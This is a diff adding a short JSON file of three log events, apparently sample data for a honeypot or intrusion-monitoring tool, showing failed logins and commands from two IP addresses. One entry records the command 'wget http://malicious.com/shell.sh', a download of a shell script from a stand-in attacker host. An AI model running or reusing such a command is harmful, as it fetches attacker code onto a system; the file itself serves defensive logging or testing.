@@ -1,0 +1,26 @@
+[
+  {
+    "timestamp": "2026-04-19T10:00:00Z",
+    "ip": "185.23.44.10",
+    "username": "admin",
+    "command": "failed login",
+    "event_type": "login",
+    "success": false
+  },
+  {
+    "timestamp": "2026-04-19T10:01:00Z",
+    "ip": "185.23.44.10",
+    "username": "root",
+    "command": "ls",
+    "event_type": "command",
+    "success": false
+  },
+  {
+    "timestamp": "2026-04-19T10:02:00Z",
+    "ip": "91.200.12.5",
+    "username": "guest",
+    "command": "wget http://malicious.com/shell.sh",
+    "event_type": "download",
+    "success": false
+  }
+]
